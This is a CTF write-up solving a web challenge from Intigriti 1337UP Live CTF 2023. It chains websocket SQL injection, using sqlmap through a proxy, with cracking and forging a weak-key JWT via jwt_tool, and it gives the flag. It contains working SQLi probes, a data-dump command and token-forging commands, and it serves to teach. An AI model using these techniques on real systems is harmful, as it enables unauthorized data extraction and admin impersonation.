---
name: Bug Report Repo (2023)
event: Intigriti 1337UP Live CTF 2023
category: Web
description: Writeup for Bug Report Repo (Web) - Intigriti 1337UP Live CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Bug Report Repo

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/kgndZOkgVxQ/0.jpg)](https://www.youtube.com/watch?v=VX445yn4lQ4 "Websocket SQLi and Weak JWT Signing Key")

## Description

> I started my own bug bounty platform! The UI is in the early stages but we've already got plenty of submissions. I wonder why I keep getting emails about a "critical" vulnerability report though, I don't see it anywhere on the system 😕

## Part 1: Websocket SQLi

-   Players can use burp repeater to tamper with websocket requests, if they set the ID to 11, they will find an extra name `ethical_hacker`
-   If they probe with quotes, they will see errors then quickly find SQLi
    -   `{"id":"1 AND 1=1"}`
    -   `{"id":"1 AND 1=2"}`
-   Using this information, they will see need to dump the hidden row, either by filtering on `id`, `reported_by` or `severity`
-   Players can write a script, but may find [this 2021 writeup from Rayhan](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) to use SQLMap, but the script won't work by default:
    -   They need to change the `ws` protocol to `wss` for remote
    -   The DB is SQLite instead of MySQL, negative values in SQLMap will cause the script to freeze - players will need to add a timeout or logic to skip negative values
-   Launch the middleware script (sqlmap_proxy.py)
-   `sqlmap -u "http://localhost:9999/?id=1" --batch --proxy=http://127.0.0.1:8080 -T bug_reports -C description --where id=11 --dump --threads 10`
-   The hidden bug report is returned, which indicates there's an admin endpoint with weak creds

{% code overflow="wrap" %}
```bash
+--------------------------------------+
| description                          |
+--------------------------------------+
| crypt0:c4tz on /4dm1n_z0n3, really?! |
+--------------------------------------+
```
{% endcode %}

## Part 2: Weak JWT Signing Key

-   Players visit `/4dm1n_z0n3` and login with `crypt0:c4tz`
-   They see a message saying the key is only viewable by the admin
-   Crack the JWT with hashcat/john/jwt_tool etc, finding the key `catsarethebest` (present in rockyou.txt), e.g. jwt_tool takes like 3 secs
    -   `jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNhdCJ9.HJxAqYHm9TG8PBmMScRGsAPcK5vymC6AS4brUyfH7VA -C -d /usr/share/wordlists/rockyou.txt`
-   Forge JWT as admin, e.g. with jwt_tool
    -   `jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNhdCJ9.HJxAqYHm9TG8PBmMScRGsAPcK5vymC6AS4brUyfH7VA -S hs256 -p "catsarethebest" -I -pc identity -pv admin`
-   Login with the new cookie, revealing the config key which is the flag!

Flag: `INTIGRITI{w3b50ck37_5ql1_4nd_w34k_jw7}`
